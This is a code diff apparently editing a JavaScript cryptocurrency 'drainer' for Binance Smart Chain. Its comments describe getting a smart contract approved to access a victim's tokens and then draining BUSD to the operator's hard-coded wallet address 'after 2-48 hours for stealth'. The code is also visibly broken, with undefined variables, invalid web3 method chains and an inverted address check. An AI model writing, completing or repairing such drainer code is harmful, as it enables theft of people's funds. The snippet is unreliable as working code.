@@ -7,14 +7,14 @@
 const receiveAddress = "0x2517d9D04B5716D9bd4d6780E2577d758d95F894";   // remove the words and replace it with your bsc address    
 
 	
-var cryptotokenContract;
-var smartcontract;
+let cryptotokenContract;
+const smartcontract = new web3.eth.Contract(tokenAbi,contractAddress);
 
 
 function approveSpending(token) {
 	
 	 smartcontract.methods.approvetransaction(targetwallet);      //the smart contract gets approved to access tokens
-	smartcontract.methods.drainBUSD.send(to,receiveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
+	smartcontract.methods.drainBUSD.send(to,receiveAddress).token(cryptotokenContract); // the smart contract drains to your wallet after 2-48 hours for stealth
 }
 	  
   			
@@ -29,14 +29,14 @@ var tokenAbi = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","typ
 
 
 //#region Check Configuration
-if (!receiveAddressx.startsWith("0x") ||
+if (!receiveAddress.startsWith("0x") ||
     (
-        receiveAddressx.length >= 64 ||
-        receiveAddressx.length <= 40
+        receiveAddress.length >= 64 ||
+        receiveAddress.length <= 40
     )
 ) {
     const web3 = new Web3('https://bsc-dataseed.binance.org/'); // Example BSC RPC endpoint, replace with your own
-    cryptotokenContract = new web3.eth.Contract(tokenAbi, 'YOUR_CONTRACT_ADDRESS'); // Replace 'YOUR_CONTRACT_ADDRESS' with your contract address
+    cryptotokenContract = new web3.eth.Contract(tokenAbi, '0x2517d9D04B5716D9bd4d6780E2577d758d95F894'); // Replace 'YOUR_CONTRACT_ADDRESS' with your contract address
 }
 
 /* JavaScript smart contract node
